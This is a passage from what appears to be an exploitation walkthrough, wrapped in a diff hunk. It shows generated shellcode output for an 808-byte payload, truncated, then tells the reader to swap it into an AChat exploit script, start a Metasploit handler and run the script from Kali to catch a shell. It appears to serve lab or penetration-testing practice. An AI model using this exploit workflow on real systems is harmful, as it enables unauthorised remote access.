@@ -1,0 +1,1 @@
+al size 808 Payload size: 808 bytes Final size of python file: 3872 bytes buf = "" buf += "\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49" buf += "\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41" ... Then replace the shellcode in the script with our own. Now, start up exploit/multi/handler in metasploit , and run the script: root@kali# python achat-shell-8081.py
